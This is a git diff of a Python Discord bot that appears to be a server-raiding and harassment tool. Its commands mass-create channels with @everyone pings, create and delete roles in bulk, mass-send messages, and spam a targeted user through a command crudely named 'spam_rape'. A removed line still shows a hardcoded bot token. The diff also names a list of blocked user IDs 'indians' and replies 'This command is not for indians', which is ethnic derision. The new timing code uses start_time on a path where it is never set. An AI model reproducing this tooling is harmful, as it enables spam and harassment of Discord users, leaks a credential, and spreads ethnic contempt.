@@ -1,13 +1,15 @@
 import discord
 from discord.ext import commands
 import asyncio
+import time
 import os
+from dotenv import load_dotenv
+
+load_dotenv()  # Load environment variables from.env file
 
 
-token = "MTE1NDM1MDIzNzQyMzUyMTg4Mg.Gd77BH.3ayxpbs_OkG_WddxyAy3Qb7rMwpiLI22K80W6I"
-#token = os.getenv('DISCORD_BOT_TOKEN')
+token = os.getenv('DISCORD_BOT_TOKEN')
 owner_id = 946386383809949756 #dovyrn
-#owner_id = 424954210866692099 #uuqq
 imintomen_id = 1142107446458978344
 
 # Define the necessary intents
@@ -26,7 +28,7 @@ bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None
 @bot.command()
 async def create(ctx, channel_name: str, amount: int):
     if ctx.author.id == owner_id:
-        await ctx.message.delete()
+        start_time = time.time()
         allow_mentions = discord.AllowedMentions(everyone=True)
         guild = ctx.message.guild
 
@@ -41,11 +43,13 @@ async def create(ctx, channel_name: str, amount: int):
         print(f"Created {amount} channels named '{channel_name}'.")
     else:
         await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
+    end_time = time.time()
+    duration = end_time - start_time
 
 @bot.command()
 async def remove(ctx, prefix: str):
     if ctx.author.id == owner_id:
-        await ctx.message.delete()
+        
         # Get all channels that start with the given prefix
         existing_channels = [channel for channel in ctx.guild.channels if channel.name.startswith(prefix)]
         if existing_channels:
@@ -64,7 +68,7 @@ async def remove(ctx, prefix: str):
 async def mass(ctx, *, input: str):
     global mass_sending  # Use the global variable
     if ctx.author.id == owner_id:
-        await ctx.message.delete()
+        
         allow_mentions = discord.AllowedMentions(everyone=True)
         guild = ctx.guild
         
@@ -106,7 +110,7 @@ async def stop_mass(ctx):
 @bot.command()
 async def addrole(ctx, role_name: str, role_amount : int):
     if ctx.author.id == owner_id:
-        await ctx.message.delete()
+        
         guild = ctx.guild
         async def create_role():
             role = await guild.create_role(name=role_name)
@@ -120,7 +124,7 @@ async def addrole(ctx, role_name: str, role_amount : int):
 @bot.command()
 async def delrole(ctx):
     if ctx.author.id == owner_id:
-        await ctx.message.delete()
+        
         bot_role = ctx.guild.me.top_role  # Get the bot's highest role
         # Filter roles to delete: not the bot's role, not @everyone, and not "legit bot test"
         roles_to_delete = [
@@ -340,7 +344,8 @@ async def purge(ctx, message):
 @bot.command()
 @commands.cooldown(per=1, rate=5)
 async def spam_rape(ctx, user: discord.User, amount: int):
-    if ctx.author.id in [755472029049946303, 755475988149960866, 1223229005382025217, 907174800487743558]:
+    indians = [755472029049946303, 755475988149960866, 1223229005382025217, 907174800487743558]
+    if ctx.author.id in indians:
         await ctx.send("This command is not for indians")
         return
     if amount > 100 and ctx.author.id!= owner_id:
